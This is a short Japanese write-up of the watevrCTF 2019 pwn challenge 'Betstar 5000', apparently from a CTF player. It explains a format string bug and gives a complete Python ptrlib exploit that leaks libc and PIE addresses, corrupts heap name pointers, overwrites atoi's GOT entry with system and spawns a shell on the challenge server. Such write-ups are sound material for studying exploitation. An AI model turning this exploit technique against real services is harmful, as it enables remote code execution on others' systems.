# [pwn 194pts] Betstar 5000 - watevrCTF 2019
64ビットバイナリで、SSP以外有効です。
```
$ checksec -f betstar5000
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               3       betstar5000
```
FSBがありますが、入力できる文字数は少なく、またヒープ上のバッファが使われます。
とりあえずアドレスをリークしたあと、ヒープ上にある名前のリストの最下位バイトを書き換え、別の名前のアドレスを指すようにします。その状態で名前を変えると、別の名前のアドレスを書き換えることができるのでRELROを指し、更にその名前を変更するとRELROを書き換えられます。
```pythonm
from ptrlib import *

elf = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")
#sock = Process("./betstar5000")
sock = Socket("13.53.69.114", 50000)

# set players
sock.sendline("1")
sock.sendline("%p.%p.%p")

# leak addr
sock.sendlineafter("game\n", "1")
sock.sendline("1")
sock.sendline("0")
sock.recvuntil("*: ")
r = sock.recvline().split(b'.')
libc_base = int(r[1], 16) - libc.symbol('_IO_2_1_stdin_')
proc_base = int(r[2], 16) - 0x8d5
logger.info("libc = " + hex(libc_base))
logger.info("proc = " + hex(proc_base))

# change name
sock.sendlineafter("game\n", "4")
sock.sendline("0")
sock.sendline("%{}c%7$hhn".format(0x88))

# overwrite name[0] to &name[1]
sock.sendlineafter("game\n", "1")
sock.sendline("1")
sock.sendline("0")

# add player
sock.sendlineafter("game\n", "3")
sock.sendline("taro")

# overwrite atoi to system
sock.sendlineafter("game\n", "4")
sock.sendline("0")
sock.sendline(p32(proc_base + elf.got("atoi")))
sock.sendlineafter("game\n", "4")
sock.sendline("1")
sock.sendline(p32(libc_base + libc.symbol("system")))

# get the shell!
sock.sendlineafter("game\n", "sh\x00")

sock.interactive()
```

# 感想
簡単ですね。
